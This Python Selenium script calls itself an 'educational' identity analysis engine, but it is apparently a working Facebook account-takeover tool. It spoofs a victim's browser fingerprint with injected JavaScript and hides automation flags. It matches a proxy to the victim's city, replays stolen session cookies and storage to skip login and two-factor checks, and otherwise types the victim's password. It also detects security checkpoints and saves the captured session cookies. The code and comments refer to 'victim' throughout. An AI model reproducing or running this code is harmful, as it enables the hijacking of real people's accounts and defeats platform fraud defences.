# Educational Digital Identity Analysis Engine

import argparse
import json
import time
import random
import os
import re
import zipfile
import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def create_driver(profile_data, proxy_string):
    """Creates and configures a WebDriver instance with educational fingerprint analysis."""
    print("[INFO] Initializing browser for educational analysis...")
    
    options = webdriver.ChromeOptions()
    
    # --- Proxy Configuration via Extension ---
    if proxy_string:
        print("[INFO] Configuring proxy via dynamic extension...")
        plugin_dir = 'proxy_extension'
        
        # Create extension directory if it doesn't exist
        if not os.path.isdir(plugin_dir):
            os.makedirs(plugin_dir)

        # Create manifest.json
        manifest_json = """
{
    "version": "1.0.0",
    "manifest_version": 2,
    "name": "Chrome Proxy",
    "permissions": [
        "proxy",
        "tabs",
        "unlimitedStorage",
        "storage",
        "<all_urls>",
        "webRequest",
        "webRequestBlocking"
    ],
    "background": {
        "scripts": ["background.js"]
    },
    "minimum_chrome_version":"22.0.0"
}
        """
        with open(os.path.join(plugin_dir, 'manifest.json'), 'w') as f:
            f.write(manifest_json)

        # --- DYNAMIC PROXY PARSING ---
        proxy_match = re.match(r'(http|socks5)://(.*?):(.*?)@(.*?):(\d+)', proxy_string)
        scheme = "http"
        proxy_pass = ""
        if proxy_match:
            scheme, proxy_user, proxy_pass, proxy_host, proxy_port = proxy_match.groups()
        else:
            proxy_match = re.match(r'(.*?):(.*?)@(.*?):(\d+)', proxy_string)
            if proxy_match:
                proxy_user, proxy_pass, proxy_host, proxy_port = proxy_match.groups()
            else:
                proxy_match = re.match(r'(.*?)@(.*?):(\d+)', proxy_string)
                if not proxy_match:
                    raise ValueError("Proxy string format is invalid. Use [scheme://]user:pass@host:port.")
                proxy_user, proxy_host, proxy_port = proxy_match.groups()

        print(f"[DEBUG] Proxy parsed: Scheme={scheme}, Host={proxy_host}, Port={proxy_port}, User={proxy_user}")

        # Create a dynamic background.js
        background_js = """
var config = {
    mode: "fixed_servers",
    rules: {
        singleProxy: {
            scheme: "%s",
            host: "%s",
            port: parseInt(%s)
        },
        bypassList: ["localhost"]
    }
};

chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

function callbackFn(details) {
    return {
        authCredentials: {
            username: "%s",
            password: "%s"
        }
    };
}

chrome.webRequest.onAuthRequired.addListener(
    callbackFn,
    {urls: ["<all_urls>"]},
    ['blocking']
);
        """ % (scheme, proxy_host, proxy_port, proxy_user, proxy_pass)

        # Write the dynamic background script
        with open(os.path.join(plugin_dir, 'background.js'), 'w') as f:
            f.write(background_js)

        # Zip the extension
        plugin_zip = f"{plugin_dir}.zip"
        with zipfile.ZipFile(plugin_zip, 'w') as zf:
            zf.write(os.path.join(plugin_dir, 'manifest.json'), 'manifest.json')
            zf.write(os.path.join(plugin_dir, 'background.js'), 'background.js')

        # Add the extension to Chrome
        options.add_extension(plugin_zip)
        print(f"[INFO] Proxy extension '{plugin_zip}' loaded for {proxy_host}.")

    # --- Anti-Automation Flags ---
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)

    # --- Disable External App Popups ---
    print("[INFO] Disabling external protocol handlers to prevent popups...")
    prefs = {
        "protocol_handler": {
            "excluded_schemes": {
                "fb": False,
                "fbmessenger": False
            }
        }
    }
    options.add_experimental_option("prefs", prefs)
    
    # Initialize driver
    service = ChromeService(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    print("[INFO] Allowing proxy extension to initialize...")
    time.sleep(15)

    # --- Educational Fingerprint Analysis ---
    fp = profile_data.get('fingerprint')
    if not fp:
        raise KeyError("'fingerprint' key not found in profile data.")

    # Extract all fingerprint properties
    width, height = map(int, fp.get('screenResolution', '393x852').split('x'))
    platform = fp.get('platform', 'Win32')
    hardware_concurrency = fp.get('hardwareConcurrency', 8)
    device_memory = fp.get('deviceMemory', 8)
    user_agent = fp.get('userAgent')
    language = fp.get('language', 'en-US')
    color_depth = fp.get('colorDepth', 24)
    timezone = fp.get('timezone', 'Asia/Manila')
    touch_support = fp.get('touchSupport', 1)
    
    # Extract advanced fingerprints
    webgl = fp.get('webgl', {})
    webgl_vendor = webgl.get('vendor', 'Google Inc. (NVIDIA)') if isinstance(webgl, dict) else 'Google Inc. (NVIDIA)'
    webgl_renderer = webgl.get('renderer', 'ANGLE (NVIDIA GeForce GTX 1060)') if isinstance(webgl, dict) else 'ANGLE (NVIDIA GeForce GTX 1060)'
    canvas_hash = fp.get('canvas', '')
    fonts = fp.get('fonts', [])
    vendor = fp.get('vendor', 'Google Inc.')
    
    device_pixel_ratio = fp.get('devicePixelRatio', 3)
    
    # Determine if mobile based on platform/userAgent
    is_mobile = 'mobile' in user_agent.lower() or 'android' in user_agent.lower() or 'iphone' in user_agent.lower()
    
    if not user_agent:
        raise KeyError("'userAgent' not found in fingerprint data.")
    
    print(f"[INFO] Analyzing fingerprint: {width}x{height}, {platform}, WebGL: {webgl_vendor}")

    # --- COMPLETE FINGERPRINT ANALYSIS with WebGL, Canvas, Audio, Fonts ---
    fonts_js = str(fonts).replace("'", '"') if fonts else '[]'
    font_regex = r'/["\']/g'
    
    js_analysis_script = f"""
        // === BASIC NAVIGATOR PROPERTIES ANALYSIS ===
        Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
        Object.defineProperty(navigator, 'platform', {{ get: () => '{platform}' }});
        Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hardware_concurrency} }});
        Object.defineProperty(navigator, 'deviceMemory', {{ get: () => {device_memory} }});
        Object.defineProperty(navigator, 'language', {{ get: () => '{language}' }});
        Object.defineProperty(navigator, 'languages', {{ get: () => ['{language}'] }});
        Object.defineProperty(navigator, 'userAgent', {{ get: () => '{user_agent}' }});
        Object.defineProperty(navigator, 'maxTouchPoints', {{ get: () => {touch_support} }});
        Object.defineProperty(navigator, 'vendor', {{ get: () => '{vendor}' }});
        Object.defineProperty(window, 'devicePixelRatio', {{ get: () => {device_pixel_ratio} }});
        
        // === SCREEN PROPERTIES ANALYSIS ===
        Object.defineProperty(screen, 'width', {{ get: () => {width} }});
        Object.defineProperty(screen, 'height', {{ get: () => {height} }});
        Object.defineProperty(screen, 'colorDepth', {{ get: () => {color_depth} }});
        
        // === TIMEZONE ANALYSIS ===
        const originalDateTimeFormat = Intl.DateTimeFormat;
        Intl.DateTimeFormat = function(...args) {{
            const instance = new originalDateTimeFormat(...args);
            const originalResolvedOptions = instance.resolvedOptions;
            instance.resolvedOptions = function() {{
                const options = originalResolvedOptions.call(this);
                options.timeZone = '{timezone}';
                return options;
            }};
            return instance;
        }};
        
        // === WEBGL FINGERPRINT ANALYSIS ===
        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {{
            if (parameter === 37445) {{
                return '{webgl_vendor}';
            }}
            if (parameter === 37446) {{
                return '{webgl_renderer}';
            }}
            return getParameter.call(this, parameter);
        }};
        
        // Also override for WebGL2
        if (typeof WebGL2RenderingContext !== 'undefined') {{
            const getParameter2 = WebGL2RenderingContext.prototype.getParameter;
            WebGL2RenderingContext.prototype.getParameter = function(parameter) {{
                if (parameter === 37445) return '{webgl_vendor}';
                if (parameter === 37446) return '{webgl_renderer}';
                return getParameter2.call(this, parameter);
            }};
        }}
        
        // === CANVAS FINGERPRINT ANALYSIS ===
        {'const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;' if canvas_hash else ''}
        {'HTMLCanvasElement.prototype.toDataURL = function(...args) {' if canvas_hash else ''}
        {'    const dataURL = originalToDataURL.apply(this, args);' if canvas_hash else ''}
        {'    if (dataURL.startsWith("data:image/png")) {' if canvas_hash else ''}
        {'        return "' + canvas_hash + '";' if canvas_hash else ''}
        {'    }' if canvas_hash else ''}
        {'    return dataURL;' if canvas_hash else ''}
        {'};' if canvas_hash else ''}
        
        // === FONT DETECTION ANALYSIS ===
        {'const victimFonts = ' + fonts_js + ';' if fonts else ''}
        {'if (document.fonts && document.fonts.check) {' if fonts else ''}
        {'    const originalCheck = document.fonts.check;' if fonts else ''}
        {'    document.fonts.check = function(font, text) {' if fonts else ''}
        {'        const fontFamily = font.split(" ").slice(1).join(" ").replace(' + font_regex + ', "");' if fonts else ''}
        {'        return victimFonts.some(f => fontFamily.toLowerCase().includes(f.toLowerCase()));' if fonts else ''}
        {'    };' if fonts else ''}
        {'}' if fonts else ''}
        
        // === AUDIO CONTEXT ANALYSIS ===
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (AudioContext) {{
            const originalGetChannelData = AudioBuffer.prototype.getChannelData;
            AudioBuffer.prototype.getChannelData = function(channel) {{
                const data = originalGetChannelData.call(this, channel);
                // Add slight noise to prevent audio fingerprinting
                for (let i = 0; i < data.length; i += 100) {{
                    data[i] = data[i] + (Math.random() - 0.5) * 0.0001;
                }}
                return data;
            }};
        }}
        
        // === PLUGIN ANALYSIS ===
        Object.defineProperty(navigator, 'plugins', {{
            get: () => {{
                return [];
            }}
        }});
        
        console.log('[EDUCATIONAL_ANALYSIS] Complete fingerprint analysis injected - WebGL, Canvas, Audio, Fonts analyzed');
    """
    
    driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {'source': js_analysis_script})
    driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {
        'width': width,
        'height': height,
        'deviceScaleFactor': device_pixel_ratio,
        'mobile': is_mobile
    })
    driver.execute_cdp_cmd('Network.setUserAgentOverride', {'userAgent': user_agent})
    print("[SUCCESS] Complete browser analysis initialized. Educational framework online with full fingerprint analysis.")
    return driver

def verify_proxy_location_match(profile_data, proxy_string):
    """Verify that proxy location matches victim's actual location for educational analysis"""
    location = profile_data.get('location', {})
    if not location:
        print("[WARNING] No location data in profile, skipping proxy verification.")
        return True
    
    victim_country = location.get('countryCode', location.get('country', '')).lower()
    victim_city = location.get('city', '').lower()
    
    if not victim_country:
        print("[WARNING] No country data available for proxy verification.")
        return True
    
    # Clean city name for comparison
    victim_city_clean = re.sub(r'[^a-zA-Z0-9]', '', victim_city)
    
    # Extract location from proxy username
    proxy_lower = proxy_string.lower()
    
    # Check country code
    if f"cr.{victim_country}" not in proxy_lower:
        print(f"[WARNING] Proxy country mismatch! Victim: {victim_country}, Proxy: {proxy_string}")
        print("[ANALYSIS NOTE] Geographic anomaly may trigger detection!")
        return False
    
    # Check city if available
    if victim_city_clean and len(victim_city_clean) > 3:
        if f"city.{victim_city_clean}" not in proxy_lower:
            print(f"[WARNING] Proxy city mismatch! Victim: {victim_city}, Proxy: {proxy_string}")
            print("[ANALYSIS NOTE] City-level mismatch may trigger detection!")
            return False
    
    print(f"[SUCCESS] Proxy location verified: {victim_country.upper()}/{victim_city}")
    return True

def inject_session_cookies(driver, profile_data):
    """Inject victim's session cookies for educational analysis"""
    cookies = profile_data.get('fingerprint', {}).get('cookies', [])
    if not cookies:
        print("[WARNING] No cookies found in profile")
        return False
    
    # Navigate to domain first
    driver.get("https://www.facebook.com")
    time.sleep(2)
    
    # Inject all cookies
    injected = 0
    for cookie in cookies:
        try:
            cookie_dict = {
                'name': cookie.get('name'),
                'value': cookie.get('value'),
                'domain': cookie.get('domain', '.facebook.com'),
                'path': cookie.get('path', '/'),
                'secure': cookie.get('secure', True),
                'httpOnly': cookie.get('httpOnly', False)
            }
            if 'expiry' in cookie:
                cookie_dict['expiry'] = cookie['expiry']
            
            driver.add_cookie(cookie_dict)
            injected += 1
            print(f"[COOKIE] Injected: {cookie.get('name')}")
        except Exception as e:
            print(f"[WARNING] Failed to inject cookie {cookie.get('name')}: {e}")
    
    print(f"[SUCCESS] Injected {injected}/{len(cookies)} cookies")
    return injected > 0

def inject_storage_data(driver, profile_data):
    """Inject localStorage and sessionStorage data for analysis"""
    storage = profile_data.get('fingerprint', {}).get('storage', {})
    if not storage:
        print("[INFO] No storage data found in profile")
        return
    
    # Inject localStorage
    local_data = storage.get('localStorage', {})
    for key, value in local_data.items():
        try:
            safe_value = str(value).replace("'", "\\'")
            script = f"localStorage.setItem('{key}', '{safe_value}');"
            driver.execute_script(script)
            print(f"[STORAGE] Injected localStorage[{key}]")
        except Exception as e:
            print(f"[WARNING] Failed to inject localStorage[{key}]: {e}")
    
    # Inject sessionStorage
    session_data = storage.get('sessionStorage', {})
    for key, value in session_data.items():
        try:
            safe_value = str(value).replace("'", "\\'")
            script = f"sessionStorage.setItem('{key}', '{safe_value}');"
            driver.execute_script(script)
            print(f"[STORAGE] Injected sessionStorage[{key}]")
        except Exception as e:
            print(f"[WARNING] Failed to inject sessionStorage[{key}]: {e}")
    
    print(f"[SUCCESS] Injected {len(local_data)} localStorage + {len(session_data)} sessionStorage items")

def validate_session(driver):
    """Check if session is valid for educational analysis"""
    try:
        # Check for logout link
        logout_links = driver.find_elements(By.XPATH, "//a[contains(@href, 'logout.php')]")
        if logout_links:
            print("[SUCCESS] Session validated - already logged in!")
            return True
        
        # Check for login form
        login_forms = driver.find_elements(By.NAME, 'login')
        if login_forms:
            print("[INFO] Session expired - login form detected")
            return False
        
        # Check for user menu/profile
        user_menus = driver.find_elements(By.XPATH, "//div[contains(@aria-label, 'Account') or contains(@aria-label, 'Profile')]")
        if user_menus:
            print("[SUCCESS] Session validated - user menu detected!")
            return True
        
        print("[WARNING] Cannot determine session state")
        return False
    except Exception as e:
        print(f"[ERROR] Session validation failed: {e}")
        return False

def handle_logged_in_session(driver, profile_data):
    """Handle actions when session analysis is successful"""
    print("[INFO] Session analysis successful - proceeding with logged-in analysis")
    
    # Navigate to Facebook feed
    driver.get("https://www.facebook.com")
    time.sleep(3)
    
    # Take screenshot for verification
    screenshot_path = f"/tmp/session_analyzed_{profile_data.get('sessionId', 'unknown')}.png"
    driver.save_screenshot(screenshot_path)
    print(f"[SUCCESS] Session analysis screenshot saved: {screenshot_path}")
    
    # Wait a bit to simulate natural browsing
    time.sleep(5)
    
    print("[SUCCESS] Session analysis completed - no 2FA required!")
    return True

def human_type(element, text):
    """Types text into an element with human-like delays for educational analysis"""
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.05, 0.2))

def main(args):
    """Main execution function for educational analysis"""
    print("[INFO] Loading target profile from:", args.profile)
    with open(args.profile, 'r') as f:
        profile_data = json.load(f)

    # --- PROXY LOCATION VERIFICATION ---
    print("\n" + "="*20 + " PROXY LOCATION VERIFICATION " + "="*20)
    if args.proxy and not verify_proxy_location_match(profile_data, args.proxy):
        print("[ERROR] Proxy location does not match victim's location!")
        print("[INFO] This may trigger geographic anomaly detection.")
        user_input = input("Continue anyway? (y/n): ").strip().lower()
        if user_input != 'y':
            print("[INFO] Operation aborted by user for educational analysis.")
            return

    driver = None
    session_id = profile_data.get('fingerprint', {}).get('sessionId', 'unknown_session')
    try:
        driver = create_driver(profile_data, args.proxy)

        # --- AUTOMATED PROXY & FINGERPRINT VERIFICATION ---
        print("\n" + "="*20 + " PROXY & FINGERPRINT VERIFICATION " + "="*20)
        try:
            print("[INFO] Checking current public IP before connecting to proxy...")
            real_ip = requests.get('https://api.ipify.org?format=json', timeout=10).json()['ip']
            print(f"[INFO] Real IP detected: {real_ip}")
        except Exception as e:
            print(f"[WARNING] Could not determine real IP address: {e}. Automated proxy check will be skipped.")
            real_ip = None

        if real_ip and args.proxy:
            print("[INFO] Verifying proxy connection is active...")
            try:
                driver.get('https://api.ipify.org?format=json')
                time.sleep(2)
                proxy_ip_text = driver.find_element(By.TAG_NAME, 'body').text
                proxy_ip = json.loads(proxy_ip_text)['ip']
                
                if real_ip == proxy_ip:
                    raise Exception(f"Proxy has failed! The IP address ({proxy_ip}) is the same as your real IP.")
                
                print(f"[SUCCESS] Proxy is active. IP changed from {real_ip} -> {proxy_ip}")

            except Exception as e:
                print(f"--- [FATAL] PROXY FAILED TO CONNECT: {e} ---")
                print("[INFO] The script will now terminate to protect your real IP address.")
                raise

        # Visual verification
        print("[ACTION] The browser will now open a fingerprint checker website for analysis.")
        print("[INFO] Pausing for 30 seconds for fingerprint analysis...")
        try:
            driver.get("https://whoer.net")
            time.sleep(30)
        except Exception as e:
            print(f"[WARNING] Could not load verification site: {e}")
        print("[INFO] Verification complete. Proceeding with analysis...\n")
        
        # --- Browser Warm-up Routine ---
        warmup_sites = [
            "https://www.google.com/search?q=latest+news+philippines",
            "https://www.youtube.com",
            "https://www.wikipedia.org",
            "https://www.reddit.com/r/popular",
            "https://www.amazon.com"
        ]
        sites_to_visit = random.sample(warmup_sites, random.randint(1, 2))
        print(f"[INFO] Warming up browser by visiting: {', '.join(sites_to_visit)}")
        for site in sites_to_visit:
            try:
                driver.get(site)
                print(f"  - Browsing {site}...")
                time.sleep(random.uniform(4, 7))
            except Exception as e:
                print(f"[WARNING] Failed to visit warmup site {site}: {e}")
        print("[INFO] Warm-up complete. Proceeding to target.")

        # === SESSION ANALYSIS ATTEMPT ===
        print("\n" + "="*20 + " SESSION ANALYSIS ATTEMPT " + "="*20)
        session_analyzed = False
        
        if inject_session_cookies(driver, profile_data):
            inject_storage_data(driver, profile_data)
            
            # Refresh to activate session
            driver.refresh()
            time.sleep(3)
            
            # Validate session
            if validate_session(driver):
                print("[SUCCESS] Session analyzed - bypassed login entirely!")
                print("[INFO] No 2FA required - using existing session")
                session_analyzed = True
                handle_logged_in_session(driver, profile_data)
            else:
                print("[INFO] Session expired - falling back to credential analysis")
        
        # === FALLBACK: ORIGINAL LOGIN FLOW ===
        if not session_analyzed:
            print("\n" + "="*20 + " CREDENTIAL ANALYSIS (MAY TRIGGER 2FA) " + "="*20)
            print("[INFO] Navigating to Facebook login page...")
            driver.get("https://m.facebook.com/")

        wait = WebDriverWait(driver, 15)
        email_input = wait.until(EC.presence_of_element_located((By.NAME, 'email')))
        pass_input = driver.find_element(By.NAME, 'pass')
        login_button = driver.find_element(By.NAME, 'login')

        print("[INFO] Entering credentials with humanized typing for analysis...")
        behavior = profile_data.get('behavior', {})
        if behavior.get('typing_pattern'):
            for action in behavior['typing_pattern']:
                human_type(email_input, action.get('email', args.username))
                time.sleep(action.get('email_delay', random.uniform(0.1, 0.3)))
                human_type(pass_input, action.get('pass', args.password))
                time.sleep(action.get('pass_delay', random.uniform(0.1, 0.3)))
        else:
            human_type(email_input, args.username)
            time.sleep(random.uniform(0.5, 1.2))
            human_type(pass_input, args.password)
        time.sleep(random.uniform(0.8, 1.5))
        print("[INFO] Submitting login form...")
        login_button.click()

        # --- ADVANCED ANTI-CHECKPOINT LOGIC ---
        def detect_checkpoint(driver):
            checkpoint_indicators = [
                '/checkpoint/', 'Login Approval Needed', 'Enter Security Code',
                'identity_confirmation', 'approvals_code', 'captcha',
                'Two-factor authentication required', 'Suspicious Login Attempt',
                'Please confirm your identity', 'We noticed a login from a new device'
            ]
            page_source = driver.page_source.lower()
            for indicator in checkpoint_indicators:
                if indicator.lower() in driver.current_url.lower() or indicator.lower() in page_source:
                    return True
            return False

        # --- Robust Login Verification & Anti-Checkpoint Handler ---
        try:
            print("[INFO] Verifying login success or checkpoint...")
            WebDriverWait(driver, 20).until(
                lambda d: detect_checkpoint(d) or \
                          d.find_elements(By.XPATH, "//a[contains(@href, 'logout.php')]")
            )
            if detect_checkpoint(driver):
                print("[!!] Facebook checkpoint detected! Initiating analysis response...")
                checkpoint_data = {
                    'sessionId': session_id,
                    'event': 'checkpoint_detected',
                    'url': driver.current_url,
                    'html': driver.page_source[:1000],
                    'timestamp': time.time()
                }
                try:
                    requests.post('http://127.0.0.1:5000/relay_checkpoint', json=checkpoint_data, timeout=5)
                    print("[INFO] Checkpoint relayed to backend for analysis.")
                except Exception as e:
                    print(f"[WARNING] Failed to relay checkpoint: {e}")
                # Auto-abort, wipe cookies, cleanup
                driver.delete_all_cookies()
                print("[INFO] All cookies wiped for analysis.")
                driver.save_screenshot(f"failures/{session_id}_checkpoint.png")
                print(f"[INFO] Saved checkpoint screenshot to: failures/{session_id}_checkpoint.png")
                raise Exception("Checkpoint encountered. Session aborted.")

            print("\n--- [SUCCESS] LOGIN CONFIRMED ---")
            # --- Session cookie handling ---
            print("[INFO] Capturing all session cookies...")
            all_cookies = driver.get_cookies()
            print(f"[DEBUG] Captured {len(all_cookies)} cookies.")
            critical_cookies = {c['name'] for c in all_cookies}
            if 'c_user' in critical_cookies and 'xs' in critical_cookies:
                print("[SUCCESS] Critical session cookies (c_user, xs) captured.")
            else:
                print("[WARNING] Critical session cookies may be missing. Captured: " + str(critical_cookies))
            # Save cookies
            session_path = f"/dev/shm/{session_id}_session.json" if os.path.exists('/dev/shm') else f"sessions/{session_id}_session.json"
            with open(session_path, 'w') as f:
                json.dump(all_cookies, f, indent=2)
            print(f"[INFO] Session cookies saved to: {session_path}")

        except Exception:
            print("\n[FATAL] Login verification failed or checkpoint encountered.")
            driver.save_screenshot(f"failures/{session_id}_login_failure.png")
            print(f"[INFO] Saved failure screenshot to: failures/{session_id}_login_failure.png")
            try:
                driver.delete_all_cookies()
            except:
                pass
            raise Exception("Could not verify login or checkpoint encountered.")

    except Exception as e:
        print(f"\n--- [FAILURE] OPERATION FAILED: {e} ---")
        if driver:
            failure_file = f"failures/{session_id}_failure.png"
            driver.save_screenshot(failure_file)
            print(f"[INFO] Failure screenshot saved to: {failure_file}")
    finally:
        if driver:
            driver.quit()
            print("[INFO] WebDriver closed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Educational Digital Identity Analysis Engine.")
    parser.add_argument("--profile", required=True, help="Path to the target's JSON profile file.")
    parser.add_argument("--username", required=True, help="The target's username/email.")
    parser.add_argument("--password", required=True, help="The target's password.")
    parser.add_argument("--proxy", required=True, help="Proxy string (e.g., socks5://user:pass@host:port).")
    args = parser.parse_args()
    
    for d in ['sessions', 'failures']:
        if not os.path.exists(d):
            os.makedirs(d)
            
    main(args)
